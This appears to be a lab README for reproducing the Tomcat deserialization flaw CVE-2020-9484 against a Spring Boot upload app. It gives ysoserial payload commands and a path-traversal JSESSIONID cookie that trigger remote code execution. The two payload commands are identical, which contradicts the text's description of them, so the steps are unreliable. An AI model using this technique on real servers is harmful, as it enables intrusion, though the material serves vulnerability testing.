# CVE-2020-9484 Tomcat Deserialization

## Description / Overview of Scenario

If a Apache Tomcat Server of certain versions is used configured in a specific way (described below)an attacker can trigger an remote code execution via deserialization with a crafted request.

## victim:

Apache Tomcat versions 10.0.0-M1 to 10.0.0-M4, 9.0.0.M1 to 9.0.34, 8.5.0 to 8.5.54 and 7.0.0 to 7.0.103
Following things must be true for the vulnerability to be accessible:
* the server is configured to use the PersistenceManager with a FileStore; and
* the PersistenceManager is configured with sessionAttributeValueClassNameFilter="null" (the default unless a SecurityManager is used) or a sufficiently lax filter to allow the attacker provided object to be deserialized; and
* an attacker is able to control the contents and name of a file on the server; and
* the attacker knows the relative file path from the storage location used by FileStore to the file the attacker has control over;
    (Quelle)[https://nvd.nist.gov/vuln/detail/CVE-2020-9484]

Includes a uploading and downloading web application written with Spring boot (war file).

Steps to reproduce web application file:

* Clone example web application from 
    git clone https://github.com/spring-guides/gs-uploading-files.git
* follow tutorial at: https://spring.io/guides/gs/uploading-files/

* change needed things to create war file
    * add:
      ```xml
        <packaging>war</packaging>
        <dependencies>
            ...
            <dependency>
               <groupId>org.springframework.boot</groupId>
               <artifactId>spring-boot-starter-tomcat</artifactId>
               <scope>provided</scope>
           </dependency>
           ...
        </dependencies>
        ```
        
   *  in Application.java add:
        ```javascript
        import org.springframework.boot.web.servlet.support.SpringBootServletInitializer;

        public class Application extends SpringBootServletInitializer{
            ...
            @Override
            protected SpringApplicationBuilder configure(SpringApplicationBuilder application) {
                 return application.sources(Application.class);
            }
        }
        ```


* compile in /initial with ./mvnw clean package

* Convert application to be able to run unter Tomcat 10

    * download migration tool: https://tomcat.apache.org/download-migration.cgi
    * and run in initial/target:
            
            java -jar jakartaee-migration-*-shaded.jar uploading.war uploading-migrated.war 

## normal
Upload and download files from victim.
Uploaded files are txt files filled with random strings, so sizes differ.

## exploit:

Uploading a crafted payload crafted with ysoserial.jar. 

Because of the PersistanceManager it is possible to send crafted POST request with JSESSIONID set to a path.

Victim tries to load Session which is not available and looks at specified path.

E.g: 
    
    Cookie : "JSESSIONID=../../../../upload-dir/malicious.session"
This session is then deserialized and enables remote code execution.
With ysoserial and the following command a malicious binary is created.

The first payload changes the access rights of the payload:

    java -jar ysoserial-master-d367e379d9-1.jar Groovy1 'bash /tmp/payload.sh' > executePayload.session

And the second payload runs the through the website uploaded payload.

    java -jar ysoserial-master-d367e379d9-1.jar Groovy1 'bash /tmp/payload.sh' > executePayload.session



